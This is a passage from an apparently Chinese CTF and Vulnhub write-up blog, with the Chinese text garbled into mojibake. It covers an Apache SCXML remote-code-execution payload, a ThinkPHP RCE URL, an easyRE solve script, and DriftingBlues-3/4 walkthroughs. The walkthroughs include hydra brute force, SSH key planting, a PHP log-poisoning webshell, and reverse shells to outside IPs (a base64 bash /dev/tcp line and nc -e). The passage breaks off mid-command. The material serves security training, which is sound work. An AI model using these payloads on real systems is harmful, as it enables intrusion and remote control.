class="line"><span class="tag">&lt;<span class="name">scxml</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2005/07/scxml&quot;</span> <span class="attr">version</span>=<span class="string">&quot;1.0&quot;</span> <span class="attr">initial</span>=<span class="string">&quot;run&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">state</span> <span class="attr">id</span>=<span class="string">&quot;run&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">onentry</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="string">&#x27;&#x27;</span>.<span class="title function_">getClass</span>().<span class="title function_">forName</span>(<span class="string">&#x27;java.lang.Runtime&#x27;</span>).<span class="title function_">getRuntime</span>().<span class="title function_">exec</span>(<span class="string">&#x27;calc&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">onentry</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">state</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">scxml</span>&gt;</span></span><br></pre></td></tr></table></figure><p>éƒ¨ç½²å®Œåçœ‹æ˜¯å¦èƒ½å¼¹è®¡ç®—å™¨ï¼Œå¼¹ä¸å‡ºçš„è¯å°±æ˜¯è¯´æ˜ç¯å¢ƒæ²¡é…ç½®æˆåŠŸ</p><p><img src="../images/image-20230425142743847.png" alt="image-20230425142743847"></p><p>ç„¶åå°±å¼€å§‹è·Ÿä¸€ä¸‹è¿™ä¸ªï¼Œçœ‹æ¼æ´åˆ©ç”¨ç‚¹åœ¨å“ª</p><h3 id="å¼€å§‹åˆ†æ"><a href="#å¼€å§‹åˆ†æ" class="headerlink" title="å¼€å§‹åˆ†æ"></a>å¼€å§‹åˆ†æ</h3><p><img src="../images/image-20230425142927413.png" alt="image-20230425142927413"></p><p>å…ˆç»™æ–­ç‚¹</p><p><img src="../images/image-20230425142945860.png" alt="image-20230425142945860"></p><p>å…ˆè·Ÿåˆ°äº†readæ–¹æ³•è¿™é‡Œ</p><p>è¿›å…¥readæ–¹æ³•ï¼Œåˆè°ƒç”¨äº†å¦ä¸€ä¸ªå‚æ•°ä¸åŒçš„readï¼Œåœ¨è¿™é‡Œä¼ å…¥æˆ‘ä»¬xmlçš„pathï¼Œå¹¶ä¸”åˆå§‹åŒ–äº†ä¸€ä¸ªConfiguration</p><p><img src="../images/image-20230425143202243.png" alt="image-20230425143202243"></p><p>å°†XMLçš„è·¯å¾„å’Œé…ç½®ç±»éƒ½ä¼ å…¥readInternalæ–¹æ³•é‡Œï¼Œè·Ÿè¿›</p><p><img src="../images/image-20230425143352387.png" alt="image-20230425143352387"></p><p><img src="../images/image-20230425143552489.png" alt="image-20230425143552489"></p><p>ç„¶ååˆå§‹åŒ–äº†ä¸€ä¸ªURLresovlerå»è¯»å–XMLï¼Œè¿™è¾¹å’±ä»¬çš„httpæœåŠ¡å°±ä¼šæ¥æ”¶åˆ°å¯¹åº”çš„è¯·æ±‚ï¼Œæœ€åè¿›å…¥readDocumentæ–¹æ³•è¿›è¡Œä¸‹ä¸€æ­¥è¯»å–</p><p><img src="../images/image-20230425143821934.png" alt="image-20230425143821934"></p><p><img src="../images/image-20230425144145979.png" alt="image-20230425144145979"></p><p>å‰é¢çš„å®ä¾‹åŒ–å¯¹è±¡å°±æ²¡æˆªå±ï¼Œåªæˆªçš„æ˜¯å…³é”®éƒ¨åˆ†</p><p><img src="../images/image-20230425144408313.png" alt="image-20230425144408313"></p><p>è·å–xmlçš„namespaceå’Œlocalnameï¼Œæœ€åè¿›å…¥readSCXMLæ–¹æ³•ä¸­è¿›è¡Œæ›´æ·±æ¬¡çš„è¯»å–</p><p>ï¼Œè¿™é‡Œå°±æ˜¯é‡ç‚¹äº†</p><p><img src="../images/image-20230425144705224.png" alt="image-20230425144705224"></p><p>è¿›å…¥readSCXMLåï¼Œç„¶åæ¥ç€è¿›å…¥readstate</p><p><img src="../images/image-20230425144903304.png" alt="image-20230425144903304"></p><p>è¿™é‡Œä¼šè·å–å‡ ä¸ªæ ‡ç­¾ï¼Œå¯ä»¥çœ‹åˆ°åŒ…æ‹¬æˆ‘ä»¬payloadé‡Œçš„stateæ ‡ç­¾ï¼Œç”±äºæœ€å¤–å±‚æ˜¯stateï¼Œå› æ­¤è¿›å…¥readstateæ–¹æ³•     </p><p><img src="../images/image-20230425145318146.png" alt="image-20230425145318146"></p><p>ç¬¬äºŒå±‚æ ‡ç­¾æ˜¯onentryï¼Œæ‰€ä»¥è¿›å…¥äº†readOnEntryæ–¹æ³•</p><p><img src="../images/image-20230425145420093.png" alt="image-20230425145420093"></p><p><img src="../images/image-20230425145447949.png" alt="image-20230425145447949"></p><p>è¿›å…¥readExecutableContextæ–¹æ³•ï¼Œæ¥ä¸‹æ¥ä¹Ÿæ˜¯é‡ç‚¹</p><p><img src="../images/image-20230425145549908.png" alt="image-20230425145549908"></p><p>ç¬¬ä¸‰å±‚æ˜¯scriptï¼Œæ‰€ä»¥è¯»å–scriptæ ‡ç­¾</p><p><img src="../images/image-20230425145700622.png" alt="image-20230425145700622"></p><p><img src="../images/image-20230425145718355.png" alt="image-20230425145718355"></p><p>è·Ÿè¿›readscript</p><p><img src="../images/image-20230425145741954.png" alt="image-20230425145741954"></p><p><strong>å¤ªèœäº†ï¼Œè·Ÿä¸ä¸‹å»äº†ï¼Œè¿˜æ˜¯å»çœ‹ä¸Šé¢çš„å¤ç°æ–‡ç« å§ï¼Œé‚£æ ·å¥½ä¸€ç‚¹</strong></p><p><img src="../images/image-20230425151120132.png" alt="image-20230425151120132"></p><p><strong>payload</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">scxml</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2005/07/scxml&quot;</span> <span class="attr">version</span>=<span class="string">&quot;1.0&quot;</span> <span class="attr">initial</span>=<span class="string">&quot;run&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">final</span> <span class="attr">id</span>=<span class="string">&quot;run&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">onexit</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">assign</span> <span class="attr">location</span>=<span class="string">&quot;flag&quot;</span> <span class="attr">expr</span>=<span class="string">&quot;&#x27;&#x27;.getClass().forName(&#x27;java.lang.Runtime&#x27;).getRuntime().exec(&#x27;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDEuNDIuMzkuMTEwLzY2NiAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;)&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">onexit</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">final</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">scxml</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>åšæ³•</strong></p><p><img src="../images/image-20230425154307051.png" alt="image-20230425154307051"></p><p><img src="../images/image-20230425154316949.png" alt="image-20230425154316949"></p><p>è¿™é‡Œå…ˆæ˜¯åœ¨è‡ªå·±çš„æœåŠ¡å™¨ä¸Šæ–°å»ºä¸€ä¸ªæ–‡ä»¶ ï¼Œç„¶åå¼€å¯ç«¯å£ç›‘å¬å°±è¡Œäº†</p><p><img src="../images/image-20230425154410279.png" alt="image-20230425154410279"></p><p><a href="https://www.xaitx.com/1936.html">è¯¦ç»†wp</a></p><p><strong>æ ¹æ®å½“æ—¶æƒ…å†µä¸€æ­¥ä¸€æ­¥çš„åˆ†æå‡ºæ¥çš„</strong></p><h2 id="HDCTF-2023-JavaMonster"><a href="#HDCTF-2023-JavaMonster" class="headerlink" title="[HDCTF 2023]JavaMonster]"></a>[HDCTF 2023]JavaMonster]</h2><p>è€ƒç‚¹</p>]]></content>
      
      
      
        <tags>
            
            <tag> HDCTF WEB 2023 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DASCTF-su-web-wp</title>
      <link href="/posts/d03af1eb.html"/>
      <url>/posts/d03af1eb.html</url>
      
        <content type="html"><![CDATA[<h2 id="ã€å›°éš¾ã€‘pdf-converter"><a href="#ã€å›°éš¾ã€‘pdf-converter" class="headerlink" title="ã€å›°éš¾ã€‘pdf_converter"></a>ã€å›°éš¾ã€‘pdf_converter</h2><p>è¿™é¢˜æ˜¯éé¢„æœŸè§£åšå‡ºæ¥çš„ï¼Œå°±æ˜¯ç›´æ¥æ‰“thinkphpæ¨¡æ¿æ¼æ´</p><p><img src="../images/image-20230422202503164.png" alt="image-20230422202503164"></p><p>å‘ç°ç‰ˆæœ¬</p><p><img src="../images/image-20230422202543023.png" alt="image-20230422202543023"></p><p>æ‰¾åˆ°æ¼æ´åˆ©ç”¨ç‚¹</p><p><img src="../images/image-20230422202620649.png" alt="image-20230422202620649"></p><p>ç„¶åç›´æ¥ç½‘ä¸Šæ‰¾payloadç›´æ¥æ‰“</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=å‘½ä»¤å‚æ•°</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230422202707601.png" alt="image-20230422202707601"></p><h2 id="easyRE"><a href="#easyRE" class="headerlink" title="easyRE"></a>easyRE</h2><p>ç»™äº†ä¸€ä¸ªexeæ–‡ä»¶ï¼Œç›´æ¥åç¼–è¯‘æˆpycæ–‡ä»¶ï¼Œä½†æ˜¯å‘ç°è¿™æ˜¯ç”¨3.11ç¼–å†™çš„ï¼Œæ‰€ä»¥uncompyle6ç”¨ä¸äº†ï¼Œé‚£å°±åªèƒ½ä½¿ç”¨pycdcæ¥çœ‹å­—èŠ‚ç (å¦‚ä¸‹)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">[Constants]</span><br><span class="line">        0</span><br><span class="line">        None</span><br><span class="line">        322376503</span><br><span class="line">        &#x27;Enter your flag: &#x27;</span><br><span class="line">        b&#x27;\x8b\xcck\xd3\xed\x96\xffFb\x06r\x085\x82\xbc \xb2\xde)p\x88Q`\x1bf\x18\xb6QUSw\x10\xcd\xd9\x13A$\x86\xe5\xcd\xd9\xff&#x27;</span><br><span class="line">        255</span><br><span class="line">        &#x27;Correct!&#x27;</span><br><span class="line">    [Disassembly]</span><br><span class="line">        0       RESUME                        0</span><br><span class="line">        2       LOAD_CONST                    0: 0</span><br><span class="line">        4       LOAD_CONST                    1: None</span><br><span class="line">        6       IMPORT_NAME                   0: random</span><br><span class="line">        8       STORE_NAME                    0: random</span><br><span class="line">        10      PUSH_NULL                     </span><br><span class="line">        12      LOAD_NAME                     0: random</span><br><span class="line">        14      LOAD_ATTR                     1: Random</span><br><span class="line">        24      LOAD_CONST                    2: 322376503</span><br><span class="line">        26      PRECALL                       1</span><br><span class="line">        30      CALL                          1</span><br><span class="line">        40      STORE_NAME                    2: r</span><br><span class="line">        42      PUSH_NULL                     </span><br><span class="line">        44      LOAD_NAME                     3: input</span><br><span class="line">        46      LOAD_CONST                    3: &#x27;Enter your flag: &#x27;</span><br><span class="line">        48      PRECALL                       1</span><br><span class="line">        52      CALL                          1</span><br><span class="line">        62      LOAD_METHOD                   4: encode</span><br><span class="line">        84      PRECALL                       0</span><br><span class="line">        88      CALL                          0</span><br><span class="line">        98      STORE_NAME                    5: pt</span><br><span class="line">        100     LOAD_CONST                    4: b&#x27;\x8b\xcck\xd3\xed\x96\xffFb\x06r\x085\x82\xbc \xb2\xde)p\x88Q`\x1bf\x18\xb6QUSw\x10\xcd\xd9\x13A$\x86\xe5\xcd\xd9\xff&#x27;</span><br><span class="line">        102     STORE_NAME                    6: ct</span><br><span class="line">        104     BUILD_LIST                    0</span><br><span class="line">        106     STORE_NAME                    7: buf</span><br><span class="line">        108     LOAD_NAME                     5: pt</span><br><span class="line">        110     GET_ITER                      </span><br><span class="line">        112     FOR_ITER                      46 (to 206)</span><br><span class="line">        114     STORE_NAME                    8: b</span><br><span class="line">        116     LOAD_NAME                     7: buf</span><br><span class="line">        118     LOAD_METHOD                   9: append</span><br><span class="line">        140     LOAD_NAME                     2: r</span><br><span class="line">        142     LOAD_METHOD                   10: randint</span><br><span class="line">        164     LOAD_CONST                    0: 0</span><br><span class="line">        166     LOAD_CONST                    5: 255</span><br><span class="line">        168     PRECALL                       2</span><br><span class="line">        172     CALL                          2</span><br><span class="line">        182     LOAD_NAME                     8: b</span><br><span class="line">        184     BINARY_OP                     12</span><br><span class="line">        188     PRECALL                       1</span><br><span class="line">        192     CALL                          1</span><br><span class="line">        202     POP_TOP                       </span><br><span class="line">        204     JUMP_BACKWARD                 47</span><br><span class="line">        206     PUSH_NULL                     </span><br><span class="line">        208     LOAD_NAME                     11: bytes</span><br><span class="line">        210     LOAD_NAME                     7: buf</span><br><span class="line">        212     PRECALL                       1</span><br><span class="line">        216     CALL                          1</span><br><span class="line">        226     LOAD_NAME                     6: ct</span><br><span class="line">        228     COMPARE_OP                    2 (==)</span><br><span class="line">        234     POP_JUMP_FORWARD_IF_TRUE      2</span><br><span class="line">        236     LOAD_ASSERTION_ERROR          </span><br><span class="line">        238     RAISE_VARARGS                 1</span><br><span class="line">        240     PUSH_NULL                     </span><br><span class="line">        242     LOAD_NAME                     12: print</span><br><span class="line">        244     LOAD_CONST                    6: &#x27;Correct!&#x27;</span><br><span class="line">        246     PRECALL                       1</span><br><span class="line">        250     CALL                          1</span><br><span class="line">        260     POP_TOP                       </span><br><span class="line">        262     LOAD_CONST                    1: None</span><br><span class="line">        264     RETURN_VALUE                  </span><br></pre></td></tr></table></figure><p>ç†è§£ä¸€ä¸‹å°±æ˜¯ä»¥ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import random</span><br><span class="line"></span><br><span class="line">r = random.Random(322376503)</span><br><span class="line"></span><br><span class="line">pt = input(&#x27;Enter your flag: &#x27;).encode()</span><br><span class="line">ct = b&#x27;\x8b\xcck\xd3\xed\x96\xffFb\x06r\x085\x82\xbc \xb2\xde)p\x88Q`\x1bf\x18\xb6QUSw\x10\xcd\xd9\x13A$\x86\xe5\xcd\xd9\xff&#x27;</span><br><span class="line"></span><br><span class="line">buf = []</span><br><span class="line">for b in pt:</span><br><span class="line">    buf.append((r.randint(0, 255) ^ b))</span><br><span class="line"></span><br><span class="line">if bytes(buf) == ct:</span><br><span class="line">    print(&quot;Correct!&quot;)</span><br></pre></td></tr></table></figure><p>ç„¶åå¯ä»¥å†™å‡ºè„šæœ¬</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import random</span><br><span class="line"></span><br><span class="line">r = random.Random(322376503)</span><br><span class="line">ct = b&#x27;\x8b\xcck\xd3\xed\x96\xffFb\x06r\x085\x82\xbc \xb2\xde)p\x88Q`\x1bf\x18\xb6QUSw\x10\xcd\xd9\x13A$\x86\xe5\xcd\xd9\xff&#x27;</span><br><span class="line">enc = []</span><br><span class="line">for i in ct:</span><br><span class="line">    enc.append(i)</span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line">for i in range(len(enc)):</span><br><span class="line">    flag += chr(r.randint(0, 255) ^ enc[i])</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> DASCTF web SU </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhubâ€”â€”DriftingBlues-4</title>
      <link href="/posts/f7456a24.html"/>
      <url>/posts/f7456a24.html</url>
      
        <content type="html"><![CDATA[<p>å…ˆæ‰«ä¸€ä¸‹cæ®µï¼Œå‘ç°ä¸€ä¸‹é¶æœºåœ°å€</p><p><img src="../images/image-20230427145027282.png" alt="image-20230427145027282"></p><p>ç„¶åæ‰«ä¸€ä¸‹ç«¯å£</p><p><img src="../images/image-20230427145130880.png" alt="image-20230427145130880"></p><p>å¼€äº†ä¸‰ä¸ªç«¯å£  å…ˆå°è¯•çœ‹èƒ½å¦è¿›è¡Œftpç™»å½•</p><p><img src="../images/image-20230427145314408.png" alt="image-20230427145314408"></p><p>å‘ç°ä¸è¡Œï¼Œä¸èƒ½åŒ¿åç™»å½•</p><p>äºæ˜¯æŸ¥çœ‹ä¸€ä¸‹80ç«¯å£</p><p><img src="../images/image-20230427145452523.png" alt="image-20230427145452523"></p><p>å‘ç°æºç å­˜åœ¨ä¸€æ®µbase64åŠ å¯†çš„å¯†æ–‡ï¼Œäºæ˜¯å°è¯•è¿›è¡Œè§£å¯†â€˜</p><p><img src="../images/image-20230427145606070.png" alt="image-20230427145606070"></p><p>æœ€åè§£å¯†çš„åˆ°è¿™ä¸ªè·¯å¾„  ç„¶åè¿›è¡Œè®¿é—®Â·Â·</p><p><img src="../images/image-20230427145659695.png" alt="image-20230427145659695"></p><p>è®¿é—®å¾—åˆ°ä»¥ä¸‹çš„ä¸€äº›ç¬¦å·ï¼Œäºæ˜¯è¿›è¡Œè§£å¯†</p><p><img src="../images/image-20230427145930036.png" alt="image-20230427145930036"></p><p><img src="../images/image-20230427150000913.png" alt="image-20230427150000913"></p><p>åˆ©ç”¨ä¸Šé¢çš„åœ¨çº¿ç½‘å€è¿›è¡Œè§£å¯†ï¼Œå‘ç°å­˜åœ¨è¿™ä¸ªä¸€ä¸ªå›¾ç‰‡è·¯å¾„  <code>/iTiS3Cr3TbiTCh.png</code></p><p><img src="../images/image-20230427150102540.png" alt="image-20230427150102540"></p><p>è®¿é—®ä¹‹åå¾—åˆ°ä¸€ä¸ªäºŒç»´ç ï¼Œç„¶åè¿›è¡Œè®¿é—®ï¼Œå¾—åˆ°ä»¥ä¸‹çš„ä¿¡æ¯</p><p><img src="../images/image-20230427193142028.png" alt="image-20230427193142028"></p><p>äºæ˜¯çŒœæµ‹è¿™å‡ ä¸ªæ˜¯ç”¨æˆ·åï¼Œäºæ˜¯å°è¯•è¿›è¡Œsshçˆ†ç ´è¯•è¯•ï¼Œå…ˆå°†è¿™å‡ ä¸ªç”¨æˆ·åä¿å­˜ä¸ºuser1.txt</p><p><img src="../images/image-20230427193338239.png" alt="image-20230427193338239"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L user1.txt -P /usr/share/wordlists/rockyou.txt ssh://192.168.142.146</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230427193516063.png" alt="image-20230427193516063"></p><p>çˆ†ç ´å¤±è´¥ï¼Œæ²¡æœ‰åŒ¹é…çš„å¯†ç </p><p>äºæ˜¯å°±å°è¯•çˆ†ç ´ä¸€ä¸‹ftp</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L user1.txt -P /usr/share/wordlists/rockyou.txt ftp://192.168.142.146</span><br></pre></td></tr></table></figure><p><strong><code>ç ´è§£å‡ºä¸€ä¸ª</code>FTP<code>ç™»å½•çš„ç”¨æˆ·åå’Œå¯†ç ï¼š</code>luther/mypics`</strong></p><p><img src="../images/image-20230427194706118.png" alt="image-20230427194706118"></p><p><img src="../images/image-20230427194157405.png" alt="image-20230427194157405"></p><p>æˆåŠŸç™»å…¥ï¼Œç„¶ååˆ‡æ¢åˆ°hubertç”¨æˆ·ä¸‹ï¼Œè¿™é‡Œçš„è¯å¯ä»¥å°è¯•ä¸€ä¸‹è¿›è¡Œsshç™»å½•ï¼Œå…ˆæ£€æŸ¥è¿™é‡Œæ˜¯å¦å­˜åœ¨<code>.ssh</code></p><p><img src="../images/image-20230427194342023.png" alt="image-20230427194342023"></p><p>æ²¡æœ‰çš„è¯åœ¨è¿™é‡Œå°±åˆ›å»ºä¸€ä¸ªï¼Œç„¶åå°±æ ¹æ®sshç™»å½•åŸç†è¿›è¡Œä¼ªé€ </p><p>å°±æ˜¯å…ˆåœ¨kaliä¸Šç”Ÿæˆssh  å…¬é’¥å’Œç§é’¥   ç„¶åæŠŠå…¬é’¥å¤åˆ¶åˆ°ftpæœåŠ¡å™¨ä¸Šï¼Œå¹¶ä¸”å‘½åä¸º<strong><code>authorized_keys</code></strong></p><p>ç„¶ååœ¨kaliä¸Šå°±å¯ä»¥ç”¨ç”Ÿæˆçš„ç§é’¥è¿›è¡Œè¯¥ç”¨æˆ·çš„ç™»å½•äº†</p><p><strong>sshç§é’¥ç™»å½•æ­¥éª¤</strong></p><p><strong>é¦–å…ˆå…ˆåœ¨<code>kaii</code>æœ¬åœ°ç”Ÿæˆç§˜é’¥<code>ssh-keygen</code> å°† <code>id_rsa.pub SSH</code> å…¬é’¥æ–‡ä»¶å¦å­˜ä¸º <code>authorized_keys</code></strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230427194943659.png" alt="image-20230427194943659"></p><p>ç„¶åä¿®æ”¹å…¬é’¥çš„åå­—</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mv id_rsa.pub authorized_keys</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230427195031935.png" alt="image-20230427195031935"></p><p>ç„¶ååœ¨ftpæœåŠ¡å™¨ä¸Šä½¿ç”¨putå‘½ä»¤ï¼Œå°†<code>authorized_keys</code>ä¼ åˆ°æœåŠ¡å™¨ä¸Š</p><p><img src="../images/image-20230427195213888.png" alt="image-20230427195213888"></p><p>æˆåŠŸä¼ è¿›å»äº† è¿™é‡Œçš„è¯  è·¯å¾„å¾—ä¸€è‡´</p><p><img src="../images/image-20230427195251240.png" alt="image-20230427195251240"></p><p>é‚£ä¹ˆç™»å½•ftpçš„æ—¶å€™ï¼Œä¹Ÿå¿…é¡»åœ¨è¿™ä¸ªkaliè·¯å¾„ä¸‹ç™»å½•</p><p>é‚£ä¹ˆç°åœ¨å°±å¯ä»¥å¯¹hubertè¿›è¡Œsshç§é’¥ç™»å½•äº†</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod 400 id_rsa</span><br><span class="line">ssh hubert@192.168.142.146 -i id_rsa</span><br></pre></td></tr></table></figure><p>ç„¶åå’ŒVulnhub DriftingBlues-3ä¸€æ ·çš„ææƒæ–¹æ³•ï¼Œä¸‹é¢å°±ä¸å¤šèµ˜è¿°äº†</p>]]></content>
      
      
      
        <tags>
            
            <tag> Vulnhub DriftingBlues-4 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DriftingBlues-3</title>
      <link href="/posts/a7ffa01f.html"/>
      <url>/posts/a7ffa01f.html</url>
      
        <content type="html"><![CDATA[<p>è¿˜æ˜¯å…ˆæ‰«ä¸€ä¸‹cæ®µ</p><p><img src="../images/image-20230421180643418.png" alt="image-20230421180643418"></p><p>è¿›è¡Œç«¯å£æ‰«æ</p><p><img src="../images/image-20230421180739563.png" alt="image-20230421180739563"></p><p>ç„¶åè¿›è¡Œè®¿é—®</p><p><img src="../images/image-20230421180934567.png" alt="image-20230421180934567"></p><p>è¿›è¡Œè®¿é—®</p><p><img src="../images/image-20230421181000421.png" alt="image-20230421181000421"></p><p><img src="../images/image-20230421181408827.png" alt="image-20230421181408827"></p><p><img src="../images/image-20230421181349395.png" alt="image-20230421181349395"></p><p>è®¿é—®ç»™çš„<code>/littlequeenofspades.html</code>  </p><p><img src="../images/image-20230421182129099.png" alt="image-20230421182129099"></p><p>ç„¶åæŸ¥çœ‹æºç ï¼Œå‘ç°ä¸€æ®µbase64ç¼–ç çš„ä»£ç ï¼Œç„¶åè¿›è¡Œè§£ç å‘ç°</p><p><img src="../images/image-20230421182611129.png" alt="image-20230421182611129"></p><p>äºæ˜¯è¿›è¡Œè®¿é—®</p><p><img src="../images/image-20230421182643602.png" alt="image-20230421182643602"></p><p>å‘ç°è¿™æ˜¯ä¸ªsshæ—¥å¿—è®°å½•   å¯ä»¥å°è¯•è¿›è¡Œæ—¥å¿—é‡Œå†™åé—¨</p><p><strong>çœ‹åˆ°å‡ºç°<code>ssh auth log --&gt; ssh</code>èº«ä»½éªŒè¯æ—¥å¿—ï¼Œå¹¶ä¸”æ³¨æ„åˆ°ç™»å½•ç”¨æˆ·åæ˜¾ç¤ºåœ¨æ—¥å¿—ä¸­ï¼Œä¹Ÿå°±æ˜¯è¯´å¦‚æœæˆ‘ä»¬ä½¿ç”¨sshç™»é™†æ—¶ï¼Œå°†ç”¨æˆ·åå†™æˆä¸€å¥è¯å°±å¯ä»¥å†™é©¬è¿›æ—¥å¿—ä¸­</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ä½¿ç”¨å‘½ä»¤ï¼šssh &#x27;&lt;?php system($_GET[&quot;a&quot;]);?&gt;&#x27;@192.168.142.142</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230421183202692.png" alt="image-20230421183202692"></p><p>ç„¶åå°è¯•çœ‹é©¬æœ‰æ²¡æœ‰å†™è¿›å»</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.142.144/adminsfixit.php?a=whoami</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230421183448490.png" alt="image-20230421183448490"></p><p>å‘ç°å¯ä»¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œ  ç„¶åè¿›è¡Œnc åå¼¹shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kaliå¼€å¯ç›‘å¬ï¼šnc -lvnp 4444</span><br><span class="line">?xa=nc -e /bin/bash 192.168.142.129 4444</span><br><span class="line">python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27; #äº¤äº’shell</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230421184535768.png" alt="image-20230421184535768"></p><p>åå¼¹æˆåŠŸï¼Œç„¶åè¿›è¡Œshelläº¤äº’</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27; </span><br></pre></td></tr></table></figure><p><img src="../images/image-20230421184638397.png" alt="image-20230421184638397"></p><p>å‘ç°è¿˜æ˜¯å­˜åœ¨<code>.ssh</code>  æ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ç›´æ¥åœ¨ç›®æ ‡æœºç”Ÿæˆä¸€ä¸ªå…¬é’¥ï¼šssh-keygen -t rsa</span><br><span 